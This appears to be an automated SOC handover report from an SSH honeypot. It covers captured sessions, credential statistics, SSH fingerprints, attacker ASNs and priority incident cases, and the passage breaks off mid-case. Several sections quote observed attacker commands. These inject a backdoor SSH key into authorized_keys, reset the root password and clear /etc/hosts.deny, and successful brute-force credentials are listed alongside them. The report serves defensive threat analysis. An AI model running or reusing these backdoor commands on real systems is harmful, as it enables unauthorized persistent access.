# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-28 |
| **Generated At** | 2026-04-28T10:20:06Z |
| **Shift Time** | 10:20 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **186** |
| Confirmed Threats | **146** |
| False Positives Filtered | **40** (21.5%) |
| Unique Attacker IPs | **46** |
| Countries of Origin | **16** |
| High Severity Cases | **22** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **164** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **36** |
| Unique Credential Pairs | **18** |
| Unique Usernames | **6** |
| Unique Passwords | **18** |
| Successful Auth Pairs | **22** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 22 |
| `345gs5662d34` | 10 |
| `GET / HTTP/1.1` | 1 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 1 |
| `*1` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `2024#xjeALK` | 1 |
| `Host: 13.235.92.17:23` | 1 |
| `Accept-Encoding: gzip` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `2024#xjeALK` | 1 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `2024#xjeALK` | `152.32.213.101` | 2026-04-28T07:01:59 |
| `root` | `3245gs5662d34` | `152.32.213.101` | 2026-04-28T07:02:02 |
| `root` | `server@123456` | `112.132.249.164` | 2026-04-28T07:24:53 |
| `root` | `3245gs5662d34` | `112.132.249.164` | 2026-04-28T07:24:57 |
| `root` | `Aspnet123!` | `110.239.88.219` | 2026-04-28T07:46:19 |
| `root` | `3245gs5662d34` | `110.239.88.219` | 2026-04-28T07:46:24 |
| `root` | `Aliyun123` | `81.9.140.220` | 2026-04-28T07:46:46 |
| `root` | `3245gs5662d34` | `81.9.140.220` | 2026-04-28T07:46:50 |
| `root` | `a1s2d3` | `116.193.190.100` | 2026-04-28T07:51:06 |
| `root` | `3245gs5662d34` | `116.193.190.100` | 2026-04-28T07:51:12 |
| `root` | `c0unt3rstr1k3` | `177.43.83.43` | 2026-04-28T08:09:30 |
| `root` | `3245gs5662d34` | `177.43.83.43` | 2026-04-28T08:09:39 |
| `root` | `g0df0r3v3r` | `106.75.222.164` | 2026-04-28T08:09:47 |
| `root` | `23` | `106.75.222.164` | 2026-04-28T08:11:52 |
| `root` | `Lenovo123` | `14.224.213.222` | 2026-04-28T09:48:46 |
| `root` | `3245gs5662d34` | `14.224.213.222` | 2026-04-28T09:48:49 |
| `root` | `torr1ent` | `24.19.160.116` | 2026-04-28T10:13:18 |
| `root` | `3245gs5662d34` | `24.19.160.116` | 2026-04-28T10:13:25 |
| `root` | `login!@` | `152.32.218.149` | 2026-04-28T10:15:37 |
| `root` | `3245gs5662d34` | `152.32.218.149` | 2026-04-28T10:15:40 |
| `root` | `lofty**` | `84.201.243.44` | 2026-04-28T10:17:49 |
| `root` | `3245gs5662d34` | `84.201.243.44` | 2026-04-28T10:17:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **186** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 59 |
| Unknown | 3 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 37 | 14 |
| `af8223ac9914...` | libssh-based | 21 | 7 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 37 | 14 | Modern SSH client |
| `af8223ac9914...` | libssh | 21 | 7 | libssh-based |
| `95420f9d932d...` | Unknown | 2 | 1 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `97281db8c1a6...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:KiTO67xxhV2N"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.75.222.164`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `84.201.243.44`, `152.32.213.101`, `152.32.218.149`, `24.19.160.116`, `112.132.249.164`, `116.193.190.100`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **46** |
| Unique ASNs | **32** |
| High-Risk ASNs | **26** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS265379` | JULIO CESAR DAS NEVES - ME | 2 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (22)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c88e5a2741a2

| Field | Detail |
|---|---|
| **Source IP** | `152.32.213[.]101` |
| **First Seen** | 2026-04-28 07:01 |
| **Last Seen** | 2026-04-28 07:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:01:58` | `cowrie.session.connect` |
| `2026-04-28 07:01:58` | `cowrie.client.version` |
| `2026-04-28 07:01:58` | `cowrie.client.kex` |
| `2026-04-28 07:01:59` | `cowrie.login.success` |
| `2026-04-28 07:01:59` | `cowrie.session.params` |
| `2026-04-28 07:01:59` | `cowrie.command.input` |
| `2026-04-28 07:01:59` | `cowrie.command.failed` |
| `2026-04-28 07:01:59` | `cowrie.log.closed` |
| `2026-04-28 07:01:59` | `cowrie.session.params` |
| `2026-04-28 07:01:59` | `cowrie.command.input` |
| `2026-04-28 07:01:59` | `cowrie.session.file_download` |
| `2026-04-28 07:01:59` | `cowrie.log.closed` |
| `2026-04-28 07:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.213[.]101` to AbuseIPDB if not already reported
- [ ] Block `152.32.213[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-739f96e5d873

| Field | Detail |
|---|---|
| **Source IP** | `152.32.213[.]101` |
| **First Seen** | 2026-04-28 07:02 |
| **Last Seen** | 2026-04-28 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:02:01` | `cowrie.session.connect` |
| `2026-04-28 07:02:01` | `cowrie.client.version` |
| `2026-04-28 07:02:01` | `cowrie.client.kex` |
| `2026-04-28 07:02:02` | `cowrie.login.success` |
| `2026-04-28 07:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.213[.]101` to AbuseIPDB if not already reported
- [ ] Block `152.32.213[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de67ec4eecde

| Field | Detail |
|---|---|
| **Source IP** | `112.132.249[.]164` |
| **First Seen** | 2026-04-28 07:24 |
| **Last Seen** | 2026-04-28 07:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:24:52` | `cowrie.session.connect` |
| `2026-04-28 07:24:52` | `cowrie.client.version` |
| `2026-04-28 07:24:53` | `cowrie.client.kex` |
| `2026-04-28 07:24:53` | `cowrie.login.success` |
| `2026-04-28 07:24:53` | `cowrie.session.params` |
| `2026-04-28 07:24:53` | `cowrie.command.input` |
| `2026-04-28 07:24:53` | `cowrie.command.failed` |
| `2026-04-28 07:24:53` | `cowrie.log.closed` |
| `2026-04-28 07:24:54` | `cowrie.session.params` |
| `2026-04-28 07:24:54` | `cowrie.command.input` |
| `2026-04-28 07:24:54` | `cowrie.session.file_download` |
| `2026-04-28 07:24:54` | `cowrie.log.closed` |
| `2026-04-28 07:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.132.249[.]164` to AbuseIPDB if not already reported
- [ ] Block `112.132.249[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-049db33bb8bb

| Field | Detail |
|---|---|
| **Source IP** | `112.132.249[.]164` |
| **First Seen** | 2026-04-28 07:24 |
| **Last Seen** | 2026-04-28 07:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:24:56` | `cowrie.session.connect` |
| `2026-04-28 07:24:56` | `cowrie.client.version` |
| `2026-04-28 07:24:56` | `cowrie.client.kex` |
| `2026-04-28 07:24:57` | `cowrie.login.success` |
| `2026-04-28 07:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.132.249[.]164` to AbuseIPDB if not already reported
- [ ] Block `112.132.249[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-353ebcb75614

| Field | Detail |
|---|---|
| **Source IP** | `110.239.88[.]219` |
| **First Seen** | 2026-04-28 07:46 |
| **Last Seen** | 2026-04-28 07:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:46:18` | `cowrie.session.connect` |
| `2026-04-28 07:46:18` | `cowrie.client.version` |
| `2026-04-28 07:46:18` | `cowrie.client.kex` |
| `2026-04-28 07:46:19` | `cowrie.login.success` |
| `2026-04-28 07:46:20` | `cowrie.session.params` |
| `2026-04-28 07:46:20` | `cowrie.command.input` |
| `2026-04-28 07:46:20` | `cowrie.command.failed` |
| `2026-04-28 07:46:20` | `cowrie.log.closed` |
| `2026-04-28 07:46:20` | `cowrie.session.params` |
| `2026-04-28 07:46:20` | `cowrie.command.input` |
| `2026-04-28 07:46:21` | `cowrie.session.file_download` |
| `2026-04-28 07:46:21` | `cowrie.log.closed` |
| `2026-04-28 07:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.239.88[.]219` to AbuseIPDB if not already reported
- [ ] Block `110.239.88[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f9d6a7c11d

| Field | Detail |
|---|---|
| **Source IP** | `110.239.88[.]219` |
| **First Seen** | 2026-04-28 07:46 |
| **Last Seen** | 2026-04-28 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:46:23` | `cowrie.session.connect` |
| `2026-04-28 07:46:23` | `cowrie.client.version` |
| `2026-04-28 07:46:23` | `cowrie.client.kex` |
| `2026-04-28 07:46:24` | `cowrie.login.success` |
| `2026-04-28 07:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.239.88[.]219` to AbuseIPDB if not already reported
- [ ] Block `110.239.88[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e5113655d73

| Field | Detail |
|---|---|
| **Source IP** | `81.9.140[.]220` |
| **First Seen** | 2026-04-28 07:46 |
| **Last Seen** | 2026-04-28 07:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:46:45` | `cowrie.session.connect` |
| `2026-04-28 07:46:45` | `cowrie.client.version` |
| `2026-04-28 07:46:45` | `cowrie.client.kex` |
| `2026-04-28 07:46:46` | `cowrie.login.success` |
| `2026-04-28 07:46:46` | `cowrie.session.params` |
| `2026-04-28 07:46:46` | `cowrie.command.input` |
| `2026-04-28 07:46:46` | `cowrie.command.failed` |
| `2026-04-28 07:46:46` | `cowrie.log.closed` |
| `2026-04-28 07:46:47` | `cowrie.session.params` |
| `2026-04-28 07:46:47` | `cowrie.command.input` |
| `2026-04-28 07:46:47` | `cowrie.session.file_download` |
| `2026-04-28 07:46:47` | `cowrie.log.closed` |
| `2026-04-28 07:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.140[.]220` to AbuseIPDB if not already reported
- [ ] Block `81.9.140[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d6429b3ad9b

| Field | Detail |
|---|---|
| **Source IP** | `81.9.140[.]220` |
| **First Seen** | 2026-04-28 07:46 |
| **Last Seen** | 2026-04-28 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:46:49` | `cowrie.session.connect` |
| `2026-04-28 07:46:49` | `cowrie.client.version` |
| `2026-04-28 07:46:49` | `cowrie.client.kex` |
| `2026-04-28 07:46:50` | `cowrie.login.success` |
| `2026-04-28 07:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.140[.]220` to AbuseIPDB if not already reported
- [ ] Block `81.9.140[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b386d1d8632c

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-28 07:51 |
| **Last Seen** | 2026-04-28 07:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:51:05` | `cowrie.session.connect` |
| `2026-04-28 07:51:05` | `cowrie.client.version` |
| `2026-04-28 07:51:06` | `cowrie.client.kex` |
| `2026-04-28 07:51:06` | `cowrie.login.success` |
| `2026-04-28 07:51:07` | `cowrie.session.params` |
| `2026-04-28 07:51:07` | `cowrie.command.input` |
| `2026-04-28 07:51:07` | `cowrie.command.failed` |
| `2026-04-28 07:51:07` | `cowrie.log.closed` |
| `2026-04-28 07:51:08` | `cowrie.session.params` |
| `2026-04-28 07:51:08` | `cowrie.command.input` |
| `2026-04-28 07:51:08` | `cowrie.session.file_download` |
| `2026-04-28 07:51:08` | `cowrie.log.closed` |
| `2026-04-28 07:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50feccd61b3f

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-28 07:51 |
| **Last Seen** | 2026-04-28 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 07:51:11` | `cowrie.session.connect` |
| `2026-04-28 07:51:11` | `cowrie.client.version` |
| `2026-04-28 07:51:11` | `cowrie.client.kex` |
| `2026-04-28 07:51:12` | `cowrie.login.success` |
| `2026-04-28 07:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b051db7593a6

| Field | Detail |
|---|---|
| **Source IP** | `177.43.83[.]43` |
| **First Seen** | 2026-04-28 08:09 |
| **Last Seen** | 2026-04-28 08:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 08:09:29` | `cowrie.session.connect` |
| `2026-04-28 08:09:29` | `cowrie.client.version` |
| `2026-04-28 08:09:29` | `cowrie.client.kex` |
| `2026-04-28 08:09:30` | `cowrie.login.success` |
| `2026-04-28 08:09:31` | `cowrie.session.params` |
| `2026-04-28 08:09:31` | `cowrie.command.input` |
| `2026-04-28 08:09:31` | `cowrie.command.failed` |
| `2026-04-28 08:09:31` | `cowrie.log.closed` |
| `2026-04-28 08:09:32` | `cowrie.session.params` |
| `2026-04-28 08:09:32` | `cowrie.command.input` |
| `2026-04-28 08:09:33` | `cowrie.session.file_download` |
| `2026-04-28 08:09:33` | `cowrie.log.closed` |
| `2026-04-28 08:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.43.83[.]43` to AbuseIPDB if not already reported
- [ ] Block `177.43.83[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-328c13194748

| Field | Detail |
|---|---|
| **Source IP** | `177.43.83[.]43` |
| **First Seen** | 2026-04-28 08:09 |
| **Last Seen** | 2026-04-28 08:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
